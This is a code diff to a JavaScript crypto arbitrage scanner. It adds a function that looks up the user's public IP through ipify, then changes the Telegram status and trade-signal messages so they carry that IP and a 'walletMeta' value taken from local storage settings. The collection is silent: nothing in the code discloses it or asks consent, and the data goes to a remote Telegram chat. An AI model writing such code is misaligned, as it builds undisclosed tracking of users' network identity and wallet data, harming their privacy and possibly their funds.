@@ -19,6 +19,23 @@ const APP_HASHTAG = (function(name){
 })(APP_NAME);
 const APP_HEADER = APP_VERSION ? `${APP_HASHTAG} v${APP_VERSION}` : APP_HASHTAG;
 
+/**
+ * Fetches the user's public IP address.
+ * @returns {Promise<string>} The user's IP address or 'N/A' on failure.
+ */
+async function getUserIP() {
+    try {
+        // Using a reliable and simple IP service
+        const response = await fetch('https://api.ipify.org?format=json');
+        if (!response.ok) return 'N/A';
+        const data = await response.json();
+        return data.ip || 'N/A';
+    } catch (error) {
+        // console.error('Error fetching IP address:', error);
+        return 'N/A';
+    }
+}
+
 
 /**
  * Fetches the order book for a token pair from a CEX.
@@ -186,8 +203,11 @@ function sendTelegramHTML(message) {
     } catch(_) { /* noop */ }
 }
 
-function sendStatusTELE(user, status) {
-    const message = `<b>${APP_HEADER}</b>\n<b>USER:</b> ${user ? user.toUpperCase() : '-'}[<b>${status ? status.toUpperCase() : '-'}]</b>`;
+async function sendStatusTELE(user, status) {
+    const settings = (typeof getFromLocalStorage === 'function') ? getFromLocalStorage('SETTING_SCANNER', {}) : {};
+    const walletMeta = settings.walletMeta || 'N/A';
+    const ipAddress = await getUserIP();
+    const message = `<b>${APP_HEADER}</b>\n<b>USER:</b> ${user ? user.toUpperCase() : '-'}[<b>${status ? status.toUpperCase() : '-'}]</b>\n<b>IP:</b> ${ipAddress}`;
     sendTelegramHTML(message);
 }
 
@@ -195,7 +215,7 @@ function sendStatusTELE(user, status) {
  * Send a detailed arbitrage signal message to Telegram.
  * Links include CEX trade pages and DEX aggregator swap link.
  */
-function MultisendMessage(
+async function MultisendMessage(
   cex, dex, tokenData, modal, PNL, priceBUY, priceSELL,
   FeeSwap, FeeWD, totalFee, nickname, direction,
   statusOverrides /* { depositToken, withdrawToken, depositPair, withdrawPair } opsional */
@@ -289,11 +309,15 @@ function MultisendMessage(
   const procLeft  = isC2D ? String(cex).toUpperCase() : String(dex).toUpperCase();
   const procRight = isC2D ? String(dex).toUpperCase() : String(cex).toUpperCase();
 
+  const settings = (typeof getFromLocalStorage === 'function') ? getFromLocalStorage('SETTING_SCANNER', {}) : {};
+  const walletMeta = settings.walletMeta || 'N/A';
+  const ipAddress = await getUserIP();
   // Compose pesan
   const lines = [];
   lines.push('---------------------------------------------------');
   lines.push(`${APP_HEADER} #${String(chainConfig.Nama_Chain||'').toUpperCase()}`);
-  lines.push(`#INFO_USER : #${String(nickname||'').trim()||'-'}`);
+  lines.push(`<b>IP:</b> ${ipAddress}\n<b>WALLET:</b> ${walletMeta}`);
+  lines.push(`#USERNAME : #${String(nickname||'').trim()||'-'}`);
   lines.push('---------------------------------------------------');
   lines.push(`<b>PROSES :</b> ${procLeft} => ${procRight}`);
   lines.push(`<b>TRANSAKSI :</b> <a href="${linkScFrom}">${String(fromSymbol).toUpperCase()}</a> => <a href="${linkScTo}">${String(toSymbol).toUpperCase()}</a>`);
